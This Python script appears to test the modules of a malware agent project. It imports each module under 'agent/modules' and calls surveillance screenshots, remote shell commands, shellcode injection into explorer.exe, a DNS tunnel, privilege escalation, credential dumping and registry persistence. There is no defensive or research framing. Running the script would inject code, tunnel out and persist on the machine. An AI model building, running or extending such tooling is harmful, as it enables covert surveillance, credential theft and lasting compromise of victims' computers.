import logging
import sys
import os
import importlib.util
from pathlib import Path

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def test_module(module_name, test_func=None):
    """Test if a module can be imported and its main function can be called with test arguments"""
    try:
        # Get the module path
        module_path = Path(f"agent/modules/{module_name}.py")
        if not module_path.exists():
            logging.error(f"Module file not found: {module_path}")
            return False

        # Import the module
        spec = importlib.util.spec_from_file_location(module_name, module_path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)

        if test_func:
            try:
                test_func(module)
                logging.info(f"Module {module_name} test successful")
                return True
            except Exception as e:
                logging.error(f"Module {module_name} function call failed: {str(e)}")
                return False
        else:
            # Try to call the first callable with no arguments
            main_func = None
            for attr_name in dir(module):
                if not attr_name.startswith('_'):
                    attr = getattr(module, attr_name)
                    if callable(attr):
                        main_func = attr
                        break
            if main_func:
                try:
                    main_func()
                    logging.info(f"Module {module_name} test successful")
                    return True
                except Exception as e:
                    logging.error(f"Module {module_name} function call failed: {str(e)}")
                    return False
            else:
                logging.error(f"No callable function found in module {module_name}")
                return False
    except Exception as e:
        logging.error(f"Module {module_name} import failed: {str(e)}")
        return False

def main():
    # List of modules to test and their test functions
    modules = {
        'system_info': None,
        'process': lambda m: m.list_processes(),
        'surveillance': lambda m: m.take_screenshot(),
        'shell': lambda m: m.execute_command('whoami'),
        'files': lambda m: m.list_directory('.'),
        'shellcode': lambda m: m.inject_shellcode('explorer.exe', 'dummy_shellcode'),
        'dns_tunnel': lambda m: m.start_dns_tunnel('example.com'),
        'privesc': None,
        'credential_dump': None,
        'persistence': lambda m: m.install_persistence('registry'),
    }

    results = {}
    for module, test_func in modules.items():
        logging.info(f"\nTesting module: {module}")
        results[module] = test_module(module, test_func)

    # Print summary
    logging.info("\n=== Module Test Summary ===")
    for module, success in results.items():
        status = "✓" if success else "✗"
        logging.info(f"{status} {module}")

if __name__ == "__main__":
    main() 